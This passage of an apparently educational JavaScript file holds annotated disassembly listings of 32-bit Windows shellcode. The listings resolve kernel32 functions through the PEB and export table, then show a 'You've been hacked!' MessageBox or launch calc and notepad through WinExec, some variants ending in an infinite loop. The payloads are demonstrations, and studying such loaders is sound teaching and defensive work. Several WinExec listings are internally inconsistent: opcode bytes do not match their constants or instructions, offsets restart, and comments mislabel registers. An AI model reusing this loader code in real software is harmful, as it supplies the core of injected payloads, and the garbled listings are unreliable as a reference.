        67: ff d0                            call   eax                                               // ExitProcess(0)`;

var MsgBoxANSEDisas = 
`Section 1: Set up a new stack frame

        0:  31 c0                     xor    eax,eax				    // Set eax to zero
        1:  64 8b 60 08          mov    esp, fs:[eax+0x8]		    // Move Segment:Offset(base) to esp
        2:  8d 2c 24                lea    ebp,[esp]				    // Load effective address specified by esp to ebp (Creates virtual stack)

Section 2: Find kernel32.dll base address

        3:  31 c0                  xor    eax,eax						// EAX = 0
        4:  64 8b 58 30        mov    ebx, fs:[eax+0x30]			// EBX = PEB(Process Environment Block) // Using offset fs:0x30 (Segment:offset)
        5:  8b 5b 0c             mov    ebx, [ebx+0xc]				// EBX = PEB_LDR_DATA // using offset 0xc
        6: 8b 5b 14              mov    ebx, [ebx+0x14]				// EBX = LDR->InMemoryOrderModuleList // using offset 0x14 (First list entry)
        7: 8b 1b                   mov    ebx, [ebx]					// EBX = second list entry (ntdll.dll) // in InMemoryOrderModuleList (offset 0x00)
        8: 8b 1b                   mov    ebx, [ebx]					// EBX = third list entry (kernel32.dll) // in InMemoryOrderModuleList (offset 0x00)
        9: 8b 5b 10              mov    ebx, [ebx+0x10]				// EBX = base address of kernel32.dll // using offset 0x10 from EBX

Section 3: Get address of GetProcAddress

        10: 8b 53 3c              mov    edx, [ebx+0x3c]				// EDX = Relative Virtual Memory (RVA) of the PE signature (base address + 0x3c)
        11: 01 da                   add    edx,ebx					// EDX = Address of PE signature = base address + RVA of PE signature
        12: 8b 52 78              mov    edx, [edx+0x78]				// EDX = RVA of Export Table = Address of PE + offset 0x78
        13: 01 da                   add    edx,ebx					// EDX = Address of Export Table = base address + RVA of export table
        14: 8b 72 20              mov    esi, [edx+0x20]				// ESI = RVA of Name Pointer Table = Address of Export Table + 0x20
        15: 01 de                   add    esi,ebx					        // ESI = Address of Name Pointer Table = base address + RVA of Name Pointer Table
        16: 31 c9                    xor    ecx,ecx				        // ECX = 0

    loopSearch:
        17: 41                                inc    ecx						        // Increment Counter
        18: ad                                lods   eax,DWORD PTR ds:[esi]		        // Load next entry in list into EAX
        19: 01 d8                           add    eax,ebx						// EAX = Address of entry = base address + Address of Entry
        20: 81 38 47 65 74 50       cmp    dword [eax],0x50746547			// Compare first byte to GetP
        21: 75 f4                             jne    loopSearch					        // Start over if not equal
        22: 81 78 04 72 6f 63 41   cmp    dword [eax+0x4],0x41636f72             // Compare second byte to rocA
        23: 75 eb                            jne    loopSearch					        // Start over if not equal

    getProcAddressFunc:
        24: 8b 7a 24                mov    edi, [edx+0x24] 				// EDI = RVA of Ordinal Table = Address of Export Table + offset 0x24
        25: 01 df                      add    edi,ebx						// EDI = Address of Ordinal Table = base address + RVA of Ordinal Table
        26: 66 8b 0c 4f            mov    cx, [edi+ecx*2]					// CX = Number of Function = Address of Ordinal Table + Counter * 2
        27: 49                          dec    ecx							// Decrement ECX (As name ordinals starts from 0)
        28: 8b 7a 1c                mov    edi,DWORD PTR [edx+0x1c]		// EDI = RVA of AddressOfFunctions
        29: 01 df                      add    edi,ebx						// EDI = AddressOfFunctions
        30: 8b 3c 8f                 mov    edi,DWORD PTR [edi+ecx*4]	        // EDI = Pointer to required function (ECX * 4 because each pointer has 4 bytes)
        31: 01 df                      add    edi,ebx					        // EDI = getProcAddress = base address + Pointer to required function

Section 4: Use LoadLibrary to load user32.dll

    getLoadLibraryA:
        32: 31 c9                          xor    ecx,ecx			// ECX = 0
        33: 51                              push   ecx		        // Push ECX onto stack
        34: 68 61 72 79 41          push   0x41797261		//
        35: 68 4c 69 62 72          push   0x7262694c		// AyrarbiLdaoL
        36: 68 4c 6f 61 64           push   0x64616f4c  		//
        37: 54                              push   esp		        // "LoadLibraryA"
        38: 53                              push   ebx			// "Kernel32.dll"
        39: ff d7                           call   edi			        // GetProcAddress(Kernel32.dll,LoadLibraryA)

    getUser32:
        40: 68 6c 6c 61 61              push   0x61616c6c			            // aall
        41: 66 81 6c 24 02 61 61    sub    WORD PTR [esp+0x2],0x6161	    // Remove additional characters "aa"
        42: 68 33 32 2e 64              push   0x642e3233   		                    // d.32
        43: 68 55 73 65 72              push   0x72657355			            // resU
        44: 54                                  push   esp						    // "User32.dll"
        45: ff d0                               call   eax						    // Call LoadLibrary(User32.dll)

Section 5: Use GetProcAddress to find the address of MessageBox

    getMessageBox:
        46: 68 6f 78 41 61           push   0x6141786f					// aAxo
        47: 66 83 6c 24 03 61     sub    WORD PTR [esp+0x3],0x61		// Remove additional character "a"
        48: 68 61 67 65 42          push   0x42656761					// Bega
        49: 68 4d 65 73 73          push   0x7373654d					// sseM
        50: 54                              push   esp					        // "MessageBoxA"
        51: 50                              push   eax						// "User.dll"
        52: ff d7                           call   edi						        // GetProcAddress(User32.dll,MessageBoxA)

Section 6: Specify the function parameters

    MessageBoxA:
        53: 83 c4 10                add    esp,0x10				// Clean the stack
        54: 31 d2                     xor    edx,edx					// EDX = 0
            55: 52                          push   edx					// Push NULL
            56: 68 6c 6f 69 74       push   0x74696f6c				// ...
            57: 68 20 45 78 70      push   0x70784520				// ...
            58: 68 6f 78 20 2d       push   0x2d20786f				// ...
            59: 68 4d 73 67 42      push   0x4267734d				// "MsgBox - Exploit"
            60: 89 e6                     mov    esi,esp					// ESI = Title
            61: 52                          push   edx					// Push terminating byte
            62: 68 6b 65 64 21      push   0x2164656b				// ...
            63: 68 20 68 61 63      push   0x63616820				// ...
            64: 68 62 65 65 6e      push   0x6e656562				// ...
            65: 68 27 76 65 20      push   0x20657627				// ...
            66: 68 20 59 6f 75       push   0x756f5920				// "You've been hacked!"
            67: 89 e1                     mov    ecx,esp					// ECX = Message

Section 7: Call the function

        68: 6a 11                 push   0x11				// Push Type (MB_OKCANCEL|MB_ICONWARNING)
        69: 56                      push   esi					// Push Title
        70: 51                      push   ecx				// Push Message
        71: 52                      push   edx				// Push NULL for windowhandle
        72: ff d0                   call   eax			    		// MessageBoxA(windowhandle,msg,title,type)`;

var MsgBoxANP_NSEDisas = 
`Section 1: Set up a new stack frame

        0:  31 c0                     xor    eax,eax				    // Set eax to zero
        1:  64 8b 60 08          mov    esp, fs:[eax+0x8]		    // Move Segment:Offset(base) to esp
        2:  8d 2c 24                lea    ebp,[esp]				    // Load effective address specified by esp to ebp (Creates virtual stack)

Section 2: Find kernel32.dll base address

        3:  31 c0                  xor    eax,eax						// EAX = 0
        4:  64 8b 58 30        mov    ebx, fs:[eax+0x30]			// EBX = PEB(Process Environment Block) // Using offset fs:0x30 (Segment:offset)
        5:  8b 5b 0c             mov    ebx, [ebx+0xc]				// EBX = PEB_LDR_DATA // using offset 0xc
        6: 8b 5b 14              mov    ebx, [ebx+0x14]				// EBX = LDR->InMemoryOrderModuleList // using offset 0x14 (First list entry)
        7: 8b 1b                   mov    ebx, [ebx]					// EBX = second list entry (ntdll.dll) // in InMemoryOrderModuleList (offset 0x00)
        8: 8b 1b                   mov    ebx, [ebx]					// EBX = third list entry (kernel32.dll) // in InMemoryOrderModuleList (offset 0x00)
        9: 8b 5b 10              mov    ebx, [ebx+0x10]				// EBX = base address of kernel32.dll // using offset 0x10 from EBX

Section 3: Get address of GetProcAddress

        10: 8b 53 3c              mov    edx, [ebx+0x3c]				// EDX = Relative Virtual Memory (RVA) of the PE signature (base address + 0x3c)
        11: 01 da                   add    edx,ebx					// EDX = Address of PE signature = base address + RVA of PE signature
        12: 8b 52 78              mov    edx, [edx+0x78]				// EDX = RVA of Export Table = Address of PE + offset 0x78
        13: 01 da                   add    edx,ebx					// EDX = Address of Export Table = base address + RVA of export table
        14: 8b 72 20              mov    esi, [edx+0x20]				// ESI = RVA of Name Pointer Table = Address of Export Table + 0x20
        15: 01 de                   add    esi,ebx					        // ESI = Address of Name Pointer Table = base address + RVA of Name Pointer Table
        16: 31 c9                    xor    ecx,ecx				        // ECX = 0

    loopSearch:
        17: 41                                inc    ecx						        // Increment Counter
        18: ad                                lods   eax,DWORD PTR ds:[esi]		        // Load next entry in list into EAX
        19: 01 d8                           add    eax,ebx						// EAX = Address of entry = base address + Address of Entry
        20: 81 38 47 65 74 50       cmp    dword [eax],0x50746547			// Compare first byte to GetP
        21: 75 f4                             jne    loopSearch					        // Start over if not equal
        22: 81 78 04 72 6f 63 41   cmp    dword [eax+0x4],0x41636f72             // Compare second byte to rocA
        23: 75 eb                            jne    loopSearch					        // Start over if not equal

    getProcAddressFunc:
        24: 8b 7a 24                mov    edi, [edx+0x24] 				// EDI = RVA of Ordinal Table = Address of Export Table + offset 0x24
        25: 01 df                      add    edi,ebx						// EDI = Address of Ordinal Table = base address + RVA of Ordinal Table
        26: 66 8b 0c 4f            mov    cx, [edi+ecx*2]					// CX = Number of Function = Address of Ordinal Table + Counter * 2
        27: 49                          dec    ecx							// Decrement ECX (As name ordinals starts from 0)
        28: 8b 7a 1c                mov    edi,DWORD PTR [edx+0x1c]		// EDI = RVA of AddressOfFunctions
        29: 01 df                      add    edi,ebx						// EDI = AddressOfFunctions
        30: 8b 3c 8f                 mov    edi,DWORD PTR [edi+ecx*4]	        // EDI = Pointer to required function (ECX * 4 because each pointer has 4 bytes)
        31: 01 df                      add    edi,ebx					        // EDI = getProcAddress = base address + Pointer to required function

Section 4: Use LoadLibrary to load user32.dll

    getLoadLibraryA:
        32: 31 c9                          xor    ecx,ecx			// ECX = 0
        33: 51                              push   ecx		        // Push ECX onto stack
        34: 68 61 72 79 41          push   0x41797261		//
        35: 68 4c 69 62 72          push   0x7262694c		// AyrarbiLdaoL
        36: 68 4c 6f 61 64           push   0x64616f4c  		//
        37: 54                              push   esp		        // "LoadLibraryA"
        38: 53                              push   ebx			// "Kernel32.dll"
        39: ff d7                           call   edi			        // GetProcAddress(Kernel32.dll,LoadLibraryA)

    getUser32:
        40: 68 6c 6c 61 61              push   0x61616c6c			            // aall
        41: 66 81 6c 24 02 61 61    sub    WORD PTR [esp+0x2],0x6161	    // Remove additional characters "aa"
        42: 68 33 32 2e 64              push   0x642e3233   		                    // d.32
        43: 68 55 73 65 72              push   0x72657355			            // resU
        44: 54                                  push   esp						    // "User32.dll"
        45: ff d0                               call   eax						    // Call LoadLibrary(User32.dll)

Section 5: Use GetProcAddress to find the address of MessageBox

    getMessageBox:
        46: 68 6f 78 41 61           push   0x6141786f					// aAxo
        47: 66 83 6c 24 03 61     sub    WORD PTR [esp+0x3],0x61		// Remove additional character "a"
        48: 68 61 67 65 42          push   0x42656761					// Bega
        49: 68 4d 65 73 73          push   0x7373654d					// sseM
        50: 54                              push   esp					        // "MessageBoxA"
        51: 50                              push   eax						// "User.dll"
        52: ff d7                           call   edi						        // GetProcAddress(User32.dll,MessageBoxA)

Section 6: Call the function

        53: 52                      push   edx				// Push NULL for windowhandle
        54: 52                      push   edx				// Push NULL for windowhandle
        55: 52                      push   edx				// Push NULL for windowhandle
        56: 52                      push   edx				// Push NULL for windowhandle
        57: ff d0                   call   eax			    		// MessageBoxA(windowhandle,msg,title,type)`;

var MsgBoxAHaltDisas = 
`Section 1: Set up a new stack frame

        0:  31 c0                     xor    eax,eax				    // Set eax to zero
        1:  64 8b 60 08          mov    esp, fs:[eax+0x8]		    // Move Segment:Offset(base) to esp
        2:  8d 2c 24                lea    ebp,[esp]				    // Load effective address specified by esp to ebp (Creates virtual stack)

Section 2: Find kernel32.dll base address

        3:  31 c0                  xor    eax,eax						// EAX = 0
        4:  64 8b 58 30        mov    ebx, fs:[eax+0x30]			// EBX = PEB(Process Environment Block) // Using offset fs:0x30 (Segment:offset)
        5:  8b 5b 0c             mov    ebx, [ebx+0xc]				// EBX = PEB_LDR_DATA // using offset 0xc
        6: 8b 5b 14              mov    ebx, [ebx+0x14]				// EBX = LDR->InMemoryOrderModuleList // using offset 0x14 (First list entry)
        7: 8b 1b                   mov    ebx, [ebx]					// EBX = second list entry (ntdll.dll) // in InMemoryOrderModuleList (offset 0x00)
        8: 8b 1b                   mov    ebx, [ebx]					// EBX = third list entry (kernel32.dll) // in InMemoryOrderModuleList (offset 0x00)
        9: 8b 5b 10              mov    ebx, [ebx+0x10]				// EBX = base address of kernel32.dll // using offset 0x10 from EBX

Section 3: Get address of GetProcAddress

        10: 8b 53 3c              mov    edx, [ebx+0x3c]				// EDX = Relative Virtual Memory (RVA) of the PE signature (base address + 0x3c)
        11: 01 da                   add    edx,ebx					// EDX = Address of PE signature = base address + RVA of PE signature
        12: 8b 52 78              mov    edx, [edx+0x78]				// EDX = RVA of Export Table = Address of PE + offset 0x78
        13: 01 da                   add    edx,ebx					// EDX = Address of Export Table = base address + RVA of export table
        14: 8b 72 20              mov    esi, [edx+0x20]				// ESI = RVA of Name Pointer Table = Address of Export Table + 0x20
        15: 01 de                   add    esi,ebx					        // ESI = Address of Name Pointer Table = base address + RVA of Name Pointer Table
        16: 31 c9                    xor    ecx,ecx				        // ECX = 0

    loopSearch:
        17: 41                                inc    ecx						        // Increment Counter
        18: ad                                lods   eax,DWORD PTR ds:[esi]		        // Load next entry in list into EAX
        19: 01 d8                           add    eax,ebx						// EAX = Address of entry = base address + Address of Entry
        20: 81 38 47 65 74 50       cmp    dword [eax],0x50746547			// Compare first byte to GetP
        21: 75 f4                             jne    loopSearch					        // Start over if not equal
        22: 81 78 04 72 6f 63 41   cmp    dword [eax+0x4],0x41636f72             // Compare second byte to rocA
        23: 75 eb                            jne    loopSearch					        // Start over if not equal

    getProcAddressFunc:
        24: 8b 7a 24                mov    edi, [edx+0x24] 				// EDI = RVA of Ordinal Table = Address of Export Table + offset 0x24
        25: 01 df                      add    edi,ebx						// EDI = Address of Ordinal Table = base address + RVA of Ordinal Table
        26: 66 8b 0c 4f            mov    cx, [edi+ecx*2]					// CX = Number of Function = Address of Ordinal Table + Counter * 2
        27: 49                          dec    ecx							// Decrement ECX (As name ordinals starts from 0)
        28: 8b 7a 1c                mov    edi,DWORD PTR [edx+0x1c]		// EDI = RVA of AddressOfFunctions
        29: 01 df                      add    edi,ebx						// EDI = AddressOfFunctions
        30: 8b 3c 8f                 mov    edi,DWORD PTR [edi+ecx*4]	        // EDI = Pointer to required function (ECX * 4 because each pointer has 4 bytes)
        31: 01 df                      add    edi,ebx					        // EDI = getProcAddress = base address + Pointer to required function

Section 4: Use LoadLibrary to load user32.dll

    getLoadLibraryA:
        32: 31 c9                          xor    ecx,ecx			// ECX = 0
        33: 51                              push   ecx		        // Push ECX onto stack
        34: 68 61 72 79 41          push   0x41797261		//
        35: 68 4c 69 62 72          push   0x7262694c		// AyrarbiLdaoL
        36: 68 4c 6f 61 64           push   0x64616f4c  		//
        37: 54                              push   esp		        // "LoadLibraryA"
        38: 53                              push   ebx			// "Kernel32.dll"
        39: ff d7                           call   edi			        // GetProcAddress(Kernel32.dll,LoadLibraryA)

    getUser32:
        40: 68 6c 6c 61 61              push   0x61616c6c			            // aall
        41: 66 81 6c 24 02 61 61    sub    WORD PTR [esp+0x2],0x6161	    // Remove additional characters "aa"
        42: 68 33 32 2e 64              push   0x642e3233   		                    // d.32
        43: 68 55 73 65 72              push   0x72657355			            // resU
        44: 54                                  push   esp						    // "User32.dll"
        45: ff d0                               call   eax						    // Call LoadLibrary(User32.dll)

Section 5: Use GetProcAddress to find the address of MessageBox

    getMessageBox:
        46: 68 6f 78 41 61           push   0x6141786f					// aAxo
        47: 66 83 6c 24 03 61     sub    WORD PTR [esp+0x3],0x61		// Remove additional character "a"
        48: 68 61 67 65 42          push   0x42656761					// Bega
        49: 68 4d 65 73 73          push   0x7373654d					// sseM
        50: 54                              push   esp					        // "MessageBoxA"
        51: 50                              push   eax						// "User.dll"
        52: ff d7                           call   edi						        // GetProcAddress(User32.dll,MessageBoxA)

Section 6: Specify the function parameters

    MessageBoxA:
        53: 83 c4 10                add    esp,0x10				// Clean the stack
        54: 31 d2                     xor    edx,edx					// EDX = 0
            55: 52                          push   edx					// Push NULL
            56: 68 6c 6f 69 74       push   0x74696f6c				// ...
            57: 68 20 45 78 70      push   0x70784520				// ...
            58: 68 6f 78 20 2d       push   0x2d20786f				// ...
            59: 68 4d 73 67 42      push   0x4267734d				// "MsgBox - Exploit"
            60: 89 e6                     mov    esi,esp					// ESI = Title
            61: 52                          push   edx					// Push terminating byte
            62: 68 6b 65 64 21      push   0x2164656b				// ...
            63: 68 20 68 61 63      push   0x63616820				// ...
            64: 68 62 65 65 6e      push   0x6e656562				// ...
            65: 68 27 76 65 20      push   0x20657627				// ...
            66: 68 20 59 6f 75       push   0x756f5920				// "You've been hacked!"
            67: 89 e1                     mov    ecx,esp					// ECX = Message

Section 7: Call the function

        68: 6a 11                 push   0x11				// Push Type (MB_OKCANCEL|MB_ICONWARNING)
        69: 56                      push   esi					// Push Title
        70: 51                      push   ecx				// Push Message
        71: 52                      push   edx				// Push NULL for windowhandle
        72: ff d0                   call   eax			    		// MessageBoxA(windowhandle,msg,title,type)
        73: e9 fb ff ff ff         jmp    0x61fccd                        // Jump to this line (Effectively entering an infinite loop)`;

var MsgBoxANP_HaltDisas = 
`Section 1: Set up a new stack frame

        0:  31 c0                     xor    eax,eax				    // Set eax to zero
        1:  64 8b 60 08          mov    esp, fs:[eax+0x8]		    // Move Segment:Offset(base) to esp
        2:  8d 2c 24                lea    ebp,[esp]				    // Load effective address specified by esp to ebp (Creates virtual stack)

Section 2: Find kernel32.dll base address

        3:  31 c0                  xor    eax,eax						// EAX = 0
        4:  64 8b 58 30        mov    ebx, fs:[eax+0x30]			// EBX = PEB(Process Environment Block) // Using offset fs:0x30 (Segment:offset)
        5:  8b 5b 0c             mov    ebx, [ebx+0xc]				// EBX = PEB_LDR_DATA // using offset 0xc
        6: 8b 5b 14              mov    ebx, [ebx+0x14]				// EBX = LDR->InMemoryOrderModuleList // using offset 0x14 (First list entry)
        7: 8b 1b                   mov    ebx, [ebx]					// EBX = second list entry (ntdll.dll) // in InMemoryOrderModuleList (offset 0x00)
        8: 8b 1b                   mov    ebx, [ebx]					// EBX = third list entry (kernel32.dll) // in InMemoryOrderModuleList (offset 0x00)
        9: 8b 5b 10              mov    ebx, [ebx+0x10]				// EBX = base address of kernel32.dll // using offset 0x10 from EBX

Section 3: Get address of GetProcAddress

        10: 8b 53 3c              mov    edx, [ebx+0x3c]				// EDX = Relative Virtual Memory (RVA) of the PE signature (base address + 0x3c)
        11: 01 da                   add    edx,ebx					// EDX = Address of PE signature = base address + RVA of PE signature
        12: 8b 52 78              mov    edx, [edx+0x78]				// EDX = RVA of Export Table = Address of PE + offset 0x78
        13: 01 da                   add    edx,ebx					// EDX = Address of Export Table = base address + RVA of export table
        14: 8b 72 20              mov    esi, [edx+0x20]				// ESI = RVA of Name Pointer Table = Address of Export Table + 0x20
        15: 01 de                   add    esi,ebx					        // ESI = Address of Name Pointer Table = base address + RVA of Name Pointer Table
        16: 31 c9                    xor    ecx,ecx				        // ECX = 0

    loopSearch:
        17: 41                                inc    ecx						        // Increment Counter
        18: ad                                lods   eax,DWORD PTR ds:[esi]		        // Load next entry in list into EAX
        19: 01 d8                           add    eax,ebx						// EAX = Address of entry = base address + Address of Entry
        20: 81 38 47 65 74 50       cmp    dword [eax],0x50746547			// Compare first byte to GetP
        21: 75 f4                             jne    loopSearch					        // Start over if not equal
        22: 81 78 04 72 6f 63 41   cmp    dword [eax+0x4],0x41636f72             // Compare second byte to rocA
        23: 75 eb                            jne    loopSearch					        // Start over if not equal

    getProcAddressFunc:
        24: 8b 7a 24                mov    edi, [edx+0x24] 				// EDI = RVA of Ordinal Table = Address of Export Table + offset 0x24
        25: 01 df                      add    edi,ebx						// EDI = Address of Ordinal Table = base address + RVA of Ordinal Table
        26: 66 8b 0c 4f            mov    cx, [edi+ecx*2]					// CX = Number of Function = Address of Ordinal Table + Counter * 2
        27: 49                          dec    ecx							// Decrement ECX (As name ordinals starts from 0)
        28: 8b 7a 1c                mov    edi,DWORD PTR [edx+0x1c]		// EDI = RVA of AddressOfFunctions
        29: 01 df                      add    edi,ebx						// EDI = AddressOfFunctions
        30: 8b 3c 8f                 mov    edi,DWORD PTR [edi+ecx*4]	        // EDI = Pointer to required function (ECX * 4 because each pointer has 4 bytes)
        31: 01 df                      add    edi,ebx					        // EDI = getProcAddress = base address + Pointer to required function

Section 4: Use LoadLibrary to load user32.dll

    getLoadLibraryA:
        32: 31 c9                          xor    ecx,ecx			// ECX = 0
        33: 51                              push   ecx		        // Push ECX onto stack
        34: 68 61 72 79 41          push   0x41797261		//
        35: 68 4c 69 62 72          push   0x7262694c		// AyrarbiLdaoL
        36: 68 4c 6f 61 64           push   0x64616f4c  		//
        37: 54                              push   esp		        // "LoadLibraryA"
        38: 53                              push   ebx			// "Kernel32.dll"
        39: ff d7                           call   edi			        // GetProcAddress(Kernel32.dll,LoadLibraryA)

    getUser32:
        40: 68 6c 6c 61 61              push   0x61616c6c			            // aall
        41: 66 81 6c 24 02 61 61    sub    WORD PTR [esp+0x2],0x6161	    // Remove additional characters "aa"
        42: 68 33 32 2e 64              push   0x642e3233   		                    // d.32
        43: 68 55 73 65 72              push   0x72657355			            // resU
        44: 54                                  push   esp						    // "User32.dll"
        45: ff d0                               call   eax						    // Call LoadLibrary(User32.dll)

Section 5: Use GetProcAddress to find the address of MessageBox

    getMessageBox:
        46: 68 6f 78 41 61           push   0x6141786f					// aAxo
        47: 66 83 6c 24 03 61     sub    WORD PTR [esp+0x3],0x61		// Remove additional character "a"
        48: 68 61 67 65 42          push   0x42656761					// Bega
        49: 68 4d 65 73 73          push   0x7373654d					// sseM
        50: 54                              push   esp					        // "MessageBoxA"
        51: 50                              push   eax						// "User.dll"
        52: ff d7                           call   edi						        // GetProcAddress(User32.dll,MessageBoxA)

Section 6: Call the function

        53: 52                      push   edx				// Push NULL for windowhandle
        54: 52                      push   edx				// Push NULL for windowhandle
        55: 52                      push   edx				// Push NULL for windowhandle
        56: 52                      push   edx				// Push NULL for windowhandle
        57: ff d0                   call   eax			    		// MessageBoxA(windowhandle,msg,title,type)
        58: e9 fb ff ff ff         jmp    0x61fccd                        // Jump to this line (Effectively entering an infinite loop)`;

// --------------------------------------------------------------------------------------------------------------------------------------

var WinExecCalcDisas = 
`Section 1: Set up a new stack frame

0:  31 c0                  xor    eax,eax                                               // EAX = 0
2:  64 8b 60 08        mov    esp,DWORD PTR fs:[eax+0x8]        // Move Segment:Offset(base) to ESP
6:  8d 2c 24              lea    ebp,[esp]                                            // Load effective address specified by ESP to EBP (Creates virtual stack)

Section 2: Find kernel.dll base address

 0:  31 c0                   xor    eax,eax                                               // EAX = 0
 2:  64 8b 58 30         mov    ebx,DWORD PTR fs:[eax+0x30]      // EBX = PEB(Process Environment Block) // Using offset fs:0x30(Segment:offset)
 6:  8b 5b 0c              mov    ebx,DWORD PTR [ebx+0xc]            // EBX = PEB_LDR_DATA // Using offset 0xc
 9:  8b 5b 14              mov    ebx,DWORD PTR [ebx+0x14]          // EBX = LDR->InMemoryOrderModuleList // Using offset 0x14 (First list entry)
 c:  8b 1b                   mov    ebx,DWORD PTR [ebx]                    // EBX = Second list entry (ntdll.dll)
 e:  8b 1b                   mov    ebx,DWORD PTR [ebx]                    // EBX = Third list entry (kernel32.dll)
 10: 8b 5b 10             mov    ebx,DWORD PTR [ebx+0x10]          // EBX = Base address of kernel32.dll // Using offset 0x10

Section 3: Get address of WinExec

 13: 8b 53 3c              mov    edx,DWORD PTR [ebx+0x3c]      // EDX = Relative Virtual Address (RVA) of the PE signature (base address + 0x3c)
 16: 01 da                   add    edx,ebx                                         // EDX = Address of PE signature = base address + RVA of PE signature
 18: 8b 52 78              mov    edx,DWORD PTR [edx+0x78]     // EDX = RVA of Export Table = Address of PE + offset 0x78
 1b: 01 da                   add    edx,ebx                                         // EDX = Address of Export Table = base address + RVA of export table
 1d: 8b 72 20              mov    esi,DWORD PTR [edx+0x20]      // ESI = RVA of Name Pointer Table = Address of Export Table + 0x20
 20: 01 de                   add    esi,ebx                                          // ESI = Address of Name Pointer Table = base address + RVA of Name Pointer Table
 22: 31 ed                   xor    ebp,ebp                                         // EBP = 0

loopSearch:
 24: 45                               inc    ebp                                                   // Increment counter ECX
 25: ad                               lods   eax,DWORD PTR ds:[esi]               // Load next list entry into EAX
 26: 01 d8                          add    eax,ebx                                           // EAX = Address of Entry = base address + Address of Entry
 28: 81 38 46 61 74 61      cmp    DWORD PTR [eax],0x456e6957   // Compare the current value to Winexec
 2e: 75 f4                           jne    loopSearch                                      // Start over if not equal

GetWinExec:
 39: 8b 7a 24                mov    edi,DWORD PTR [edx+0x24]          // EDI = RVA of Ordinal Table = Address of Export Table + offset 0x24
 3c: 01 df                      add    edi,ebx                                              // EDI = Address of Ordinal Table = base address + RVA of Ordinal Table
 3e: 66 8b 2c 6f            mov    bp,WORD PTR [edi+ebp*2]             // CX = Number of Function = Address of Ordinal Table + Counter * 2
 42: 8b 7a 1c                mov    edi,DWORD PTR [edx+0x1c]          // Decrement ECX (To obtain starting Ordinal Value)
 45: 01 df                      add    edi,ebx                                              // EDI = RVA of Address Table = Address of Ordinal Table + offset 0x1c
 47: 8b 7c af fc             mov    edi,DWORD PTR [edi+ebp*4-0x4]   // EDI = Address of Adress Table = base address + RVA of Address Table
 4b: 01 df                      add    edi,ebx                                              // EDI = Address of Adress Table = base address + RVA of Address Table

Section 4: Call function

 4f: 50                      push   0x5                       // Push 5 (= show)
 50: 50                     push   0x636c6163         // Push Calc
 51: ff d7                  call   edi                          // WinExec(Calc, 5)`

 var WinExecCalcHaltDisas = 
`Section 1: Set up a new stack frame

0:  31 c0                  xor    eax,eax                                               // EAX = 0
2:  64 8b 60 08        mov    esp,DWORD PTR fs:[eax+0x8]        // Move Segment:Offset(base) to ESP
6:  8d 2c 24              lea    ebp,[esp]                                            // Load effective address specified by ESP to EBP (Creates virtual stack)

Section 2: Find kernel.dll base address

 0:  31 c0                   xor    eax,eax                                               // EAX = 0
 2:  64 8b 58 30         mov    ebx,DWORD PTR fs:[eax+0x30]      // EBX = PEB(Process Environment Block) // Using offset fs:0x30(Segment:offset)
 6:  8b 5b 0c              mov    ebx,DWORD PTR [ebx+0xc]            // EBX = PEB_LDR_DATA // Using offset 0xc
 9:  8b 5b 14              mov    ebx,DWORD PTR [ebx+0x14]          // EBX = LDR->InMemoryOrderModuleList // Using offset 0x14 (First list entry)
 c:  8b 1b                   mov    ebx,DWORD PTR [ebx]                    // EBX = Second list entry (ntdll.dll)
 e:  8b 1b                   mov    ebx,DWORD PTR [ebx]                    // EBX = Third list entry (kernel32.dll)
 10: 8b 5b 10             mov    ebx,DWORD PTR [ebx+0x10]          // EBX = Base address of kernel32.dll // Using offset 0x10

Section 3: Get address of WinExec

 13: 8b 53 3c              mov    edx,DWORD PTR [ebx+0x3c]      // EDX = Relative Virtual Address (RVA) of the PE signature (base address + 0x3c)
 16: 01 da                   add    edx,ebx                                         // EDX = Address of PE signature = base address + RVA of PE signature
 18: 8b 52 78              mov    edx,DWORD PTR [edx+0x78]     // EDX = RVA of Export Table = Address of PE + offset 0x78
 1b: 01 da                   add    edx,ebx                                         // EDX = Address of Export Table = base address + RVA of export table
 1d: 8b 72 20              mov    esi,DWORD PTR [edx+0x20]      // ESI = RVA of Name Pointer Table = Address of Export Table + 0x20
 20: 01 de                   add    esi,ebx                                          // ESI = Address of Name Pointer Table = base address + RVA of Name Pointer Table
 22: 31 ed                   xor    ebp,ebp                                         // EBP = 0

loopSearch:
 24: 45                               inc    ebp                                                   // Increment counter ECX
 25: ad                               lods   eax,DWORD PTR ds:[esi]               // Load next list entry into EAX
 26: 01 d8                          add    eax,ebx                                           // EAX = Address of Entry = base address + Address of Entry
 28: 81 38 46 61 74 61      cmp    DWORD PTR [eax],0x456e6957   // Compare the current value to Winexec
 2e: 75 f4                           jne    loopSearch                                      // Start over if not equal

GetWinExec:
 39: 8b 7a 24                mov    edi,DWORD PTR [edx+0x24]          // EDI = RVA of Ordinal Table = Address of Export Table + offset 0x24
 3c: 01 df                      add    edi,ebx                                              // EDI = Address of Ordinal Table = base address + RVA of Ordinal Table
 3e: 66 8b 2c 6f            mov    bp,WORD PTR [edi+ebp*2]             // CX = Number of Function = Address of Ordinal Table + Counter * 2
 42: 8b 7a 1c                mov    edi,DWORD PTR [edx+0x1c]          // Decrement ECX (To obtain starting Ordinal Value)
 45: 01 df                      add    edi,ebx                                              // EDI = RVA of Address Table = Address of Ordinal Table + offset 0x1c
 47: 8b 7c af fc             mov    edi,DWORD PTR [edi+ebp*4-0x4]   // EDI = Address of Adress Table = base address + RVA of Address Table
 4b: 01 df                      add    edi,ebx                                              // EDI = Address of Adress Table = base address + RVA of Address Table

Section 4: Call function

 4f: 50                      push   0x5                       // Push 5 (= show)
 50: 50                     push   0x636c6163         // Push Calc
 51: ff d7                  call   edi                          // WinExec(Calc, 5)
 52: e9 fb ff ff ff        jmp    0x61fccd               // Jump to this line (Effectively entering an infinite loop)`;

 var WinExecNotepadDisas = 
`Section 1: Set up a new stack frame

0:  31 c0                  xor    eax,eax                                               // EAX = 0
2:  64 8b 60 08        mov    esp,DWORD PTR fs:[eax+0x8]        // Move Segment:Offset(base) to ESP
6:  8d 2c 24              lea    ebp,[esp]                                            // Load effective address specified by ESP to EBP (Creates virtual stack)

Section 2: Find kernel.dll base address

 0:  31 c0                   xor    eax,eax                                               // EAX = 0
 2:  64 8b 58 30         mov    ebx,DWORD PTR fs:[eax+0x30]      // EBX = PEB(Process Environment Block) // Using offset fs:0x30(Segment:offset)
 6:  8b 5b 0c              mov    ebx,DWORD PTR [ebx+0xc]            // EBX = PEB_LDR_DATA // Using offset 0xc
 9:  8b 5b 14              mov    ebx,DWORD PTR [ebx+0x14]          // EBX = LDR->InMemoryOrderModuleList // Using offset 0x14 (First list entry)
 c:  8b 1b                   mov    ebx,DWORD PTR [ebx]                    // EBX = Second list entry (ntdll.dll)
